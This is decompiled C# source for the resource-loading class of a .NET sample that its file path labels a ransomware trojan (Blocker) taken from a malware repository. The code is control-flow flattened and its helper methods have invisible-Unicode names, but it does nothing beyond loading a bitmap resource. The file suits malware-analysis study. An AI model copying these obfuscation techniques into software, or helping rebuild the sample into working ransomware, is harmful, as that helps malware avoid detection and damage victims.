// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Properties.Resources
// Assembly: ILegacyEvidenceAdapt, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 7C8AEC27-D027-41D5-B71C-E99019A8E594
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-a42b3919356aa815980faeac0fc6222bd4a2d6f6cc5bdc01c5a5f55014a9c66e.exe

using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Cytotechnologist.Properties
{
  [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
  [CompilerGenerated]
  [DebuggerNonUserCode]
  internal class Resources
  {
    private static ResourceManager resourceMan;
    private static CultureInfo resourceCulture;

    internal Resources()
    {
label_1:
      int num1 = 568274130;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1849506247)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -554229334 ^ -206703000;
            continue;
          case 1:
            num1 = (int) num2 * 572691054 ^ -1232886651;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static ResourceManager ResourceManager
    {
      get
      {
label_1:
        int num1 = 1049853876;
        ResourceManager resourceManager;
        ResourceManager resourceMan;
        bool flag;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 13789637)) % 10U)
          {
            case 0:
              num1 = (int) num2 * 1859613168 ^ -1270516247;
              continue;
            case 1:
              num1 = (int) num2 * -1917796620 ^ 2043396478;
              continue;
            case 2:
              resourceMan = Cytotechnologist.Properties.Resources.resourceMan;
              num1 = 48598345;
              continue;
            case 3:
              Cytotechnologist.Properties.Resources.resourceMan = resourceManager;
              num1 = (int) num2 * 614458519 ^ -1969598690;
              continue;
            case 4:
              num1 = (int) num2 * 1145829353 ^ 1893402131;
              continue;
            case 5:
              int num3 = !flag ? -482222437 : (num3 = -1895338612);
              num1 = num3 ^ (int) num2 * -1153479114;
              continue;
            case 7:
              flag = Cytotechnologist.Properties.Resources.resourceMan == null;
              num1 = (int) num2 * -1215129545 ^ -1648236139;
              continue;
            case 8:
              goto label_1;
            case 9:
              resourceManager = Cytotechnologist.Properties.Resources.\u200B‎⁫‭⁬‌‫‮​⁪⁫⁬‮‌‪‫⁮⁯‍‬⁪⁭‌‎‬⁭‍⁪‪⁬⁭‏‌⁪‮⁭⁫‬‫‬‮("Cytotechnologist.Properties.Resources", Cytotechnologist.Properties.Resources.\u202B‍⁭‫⁭⁯‎‍‫‭‎⁯‌⁯‌‍⁯⁭⁬‏‏⁭‭⁯⁭⁯⁭⁪⁮‬‌‎‮⁬‭‎‍‮⁯‫‮(Cytotechnologist.Properties.Resources.\u206B⁪​‌⁮⁯⁬‮‬‪‏⁭⁮⁭‭‎⁫⁯⁯⁮⁯⁬‍‪‮‬‍⁭⁯⁮‍⁬‭⁫⁮‭‭‪‌‬‮(__typeref (Cytotechnologist.Properties.Resources))));
              num1 = (int) num2 * -573420825 ^ -1349595141;
              continue;
            default:
              goto label_11;
          }
        }
label_11:
        return resourceMan;
      }
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static CultureInfo Culture
    {
      get
      {
label_1:
        int num1 = 537318432;
        CultureInfo resourceCulture;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2075381790)) % 4U)
          {
            case 1:
              num1 = (int) num2 * 839803599 ^ 37596729;
              continue;
            case 2:
              resourceCulture = Cytotechnologist.Properties.Resources.resourceCulture;
              num1 = (int) num2 * 611335838 ^ 2143888219;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return resourceCulture;
      }
      set => Cytotechnologist.Properties.Resources.resourceCulture = value;
    }

    internal static Bitmap WinRTTypeNameConvert
    {
      get
      {
label_1:
        int num1 = 2005311424;
        Bitmap rtTypeNameConvert;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 314743809)) % 4U)
          {
            case 0:
              num1 = (int) num2 * -1166703429 ^ -462906870;
              continue;
            case 1:
              rtTypeNameConvert = (Bitmap) Cytotechnologist.Properties.Resources.\u200D⁬‏⁭⁬⁪‭⁪‍⁯⁮⁪‪⁬‭⁮‍⁯‍‪⁭⁭‮⁯‮‌​‬⁯​⁯‬⁯‫‬​‭⁯‌‭‮(Cytotechnologist.Properties.Resources.ResourceManager, nameof (WinRTTypeNameConvert), Cytotechnologist.Properties.Resources.resourceCulture);
              num1 = (int) num2 * 1354302682 ^ 1460288799;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return rtTypeNameConvert;
      }
    }

    static Type \u206B⁪​‌⁮⁯⁬‮‬‪‏⁭⁮⁭‭‎⁫⁯⁯⁮⁯⁬‍‪‮‬‍⁭⁯⁮‍⁬‭⁫⁮‭‭‪‌‬‮([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

    static Assembly \u202B‍⁭‫⁭⁯‎‍‫‭‎⁯‌⁯‌‍⁯⁭⁬‏‏⁭‭⁯⁭⁯⁭⁪⁮‬‌‎‮⁬‭‎‍‮⁯‫‮([In] Type obj0) => obj0.Assembly;

    static ResourceManager \u200B‎⁫‭⁬‌‫‮​⁪⁫⁬‮‌‪‫⁮⁯‍‬⁪⁭‌‎‬⁭‍⁪‪⁬⁭‏‌⁪‮⁭⁫‬‫‬‮(
      [In] string obj0,
      [In] Assembly obj1)
    {
      return new ResourceManager(obj0, obj1);
    }

    static object \u200D⁬‏⁭⁬⁪‭⁪‍⁯⁮⁪‪⁬‭⁮‍⁯‍‪⁭⁭‮⁯‮‌​‬⁯​⁯‬⁯‫‬​‭⁯‌‭‮(
      [In] ResourceManager obj0,
      [In] string obj1,
      [In] CultureInfo obj2)
    {
      return obj0.GetObject(obj1, obj2);
    }
  }
}
